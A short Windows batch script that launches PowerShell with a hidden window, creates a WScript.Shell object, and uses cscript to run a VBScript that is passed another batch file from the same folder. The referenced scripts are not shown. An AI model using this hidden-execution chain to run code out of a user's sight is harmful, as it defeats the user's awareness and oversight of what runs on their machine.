@echo off
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell"
cscript %~dp0\i.vbs %~dp0\e.cmd
@exit